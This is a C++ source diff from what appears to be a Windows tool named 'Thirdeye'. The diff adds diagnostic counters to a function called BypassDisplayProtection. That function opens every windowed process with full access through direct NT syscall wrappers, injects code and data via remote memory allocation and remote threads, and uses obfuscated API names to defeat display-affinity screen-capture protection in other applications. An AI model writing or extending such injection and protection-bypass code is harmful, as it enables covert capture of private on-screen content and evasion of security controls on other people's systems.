@@ -408,7 +408,15 @@ DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
 #endif
 
 size_t GetRemoteSectionSize() {
-    HMODULE hMod = GetModuleHandle(nullptr);
+    HMODULE hMod = nullptr;
+    if (!GetModuleHandleExA(
+            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+            reinterpret_cast<LPCSTR>(&RemoteThreadProc),
+            &hMod) ||
+        !hMod) {
+        return 0;
+    }
+
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDosHeader->e_lfanew);
     PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
@@ -477,6 +485,13 @@ static void CleanupInjections(std::vector<RemoteContext>& injections) {
 static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger, std::vector<RemoteContext>& activeInjections) {
     std::map<DWORD, std::vector<HWND>> processWindows;
     EnumWindows(EnumWindowsProc, (LPARAM)&processWindows);
+    size_t skippedBlacklisted = 0;
+    size_t openFailed = 0;
+    size_t opened = 0;
+    size_t duplicateFailed = 0;
+    size_t allocationFailed = 0;
+    size_t writeFailed = 0;
+    size_t threadFailed = 0;
 
     if (!hGlobalTrigger) {
         SetLastErrorMsg(ctx, "Invalid trigger event");
@@ -496,10 +511,17 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
     }
 
     for (auto const& [pid, hwnds] : processWindows) {
-        if (IsProcessBlacklisted(pid)) continue;
+        if (IsProcessBlacklisted(pid)) {
+            skippedBlacklisted++;
+            continue;
+        }
 
         HANDLE hProcess = NtOpenProcessDirect(pid, PROCESS_ALL_ACCESS);
-        if (!hProcess) continue;
+        if (!hProcess) {
+            openFailed++;
+            continue;
+        }
+        opened++;
 
         INJECTION_DATA data = { 0 };
         data.count = hwnds.size() < MAX_HWNDS_PER_PID ? (DWORD)hwnds.size() : MAX_HWNDS_PER_PID;
@@ -523,18 +545,21 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             !SafeCopyString(data.enterCritSecName, DECR_STR(obfEnterCS)) ||
             !SafeCopyString(data.leaveCritSecName, DECR_STR(obfLeaveCS))) {
             NtCloseDirect(hProcess);
+            writeFailed++;
             continue;
         }
 
         if (!DuplicateHandle(GetCurrentProcess(), hGlobalTrigger, hProcess, &data.hGlobalTriggerEvent,
             0, FALSE, DUPLICATE_SAME_ACCESS)) {
             NtCloseDirect(hProcess);
+            duplicateFailed++;
             continue;
         }
 
         if (!DuplicateHandle(GetCurrentProcess(), hReadySemaphore.get(), hProcess, &data.hReadySemaphore,
             SEMAPHORE_MODIFY_STATE | SYNCHRONIZE, FALSE, 0)) {
             NtCloseDirect(hProcess);
+            duplicateFailed++;
             continue;
         }
 
@@ -546,12 +571,14 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             !SafeCopyString(data.setFuncName, DECR_STR(obfSetWDA)) ||
             !SafeCopyString(data.getFuncName, DECR_STR(obfGetWDA))) {
             NtCloseDirect(hProcess);
+            writeFailed++;
             continue;
         }
 
         LPVOID pRemoteData = NtAllocateMemoryDirect(hProcess, sizeof(INJECTION_DATA), PAGE_READWRITE);
         if (!pRemoteData) {
             NtCloseDirect(hProcess);
+            allocationFailed++;
             continue;
         }
 
@@ -559,6 +586,7 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
         if (!pRemoteCode) {
             NtFreeMemoryDirect(hProcess, pRemoteData);
             NtCloseDirect(hProcess);
+            allocationFailed++;
             continue;
         }
 
@@ -572,6 +600,7 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             NtFreeMemoryDirect(hProcess, pRemoteData);
             NtFreeMemoryDirect(hProcess, pRemoteCode);
             NtCloseDirect(hProcess);
+            writeFailed++;
             continue;
         }
 
@@ -580,6 +609,7 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             NtFreeMemoryDirect(hProcess, pRemoteData);
             NtFreeMemoryDirect(hProcess, pRemoteCode);
             NtCloseDirect(hProcess);
+            threadFailed++;
             continue;
         }
 
@@ -591,6 +621,19 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             WaitForSingleObject(hReadySemaphore.get(), 1000);
         }
     }
+
+    std::ostringstream msg;
+    msg << "bypass_diag processes=" << processWindows.size()
+        << " skipped_blacklisted=" << skippedBlacklisted
+        << " opened=" << opened
+        << " injections=" << activeInjections.size()
+        << " open_failed=" << openFailed
+        << " duplicate_failed=" << duplicateFailed
+        << " allocation_failed=" << allocationFailed
+        << " write_failed=" << writeFailed
+        << " thread_failed=" << threadFailed
+        << " section_size=" << sectionSize;
+    SetLastErrorMsg(ctx, msg.str().c_str());
 
     return true;
 }
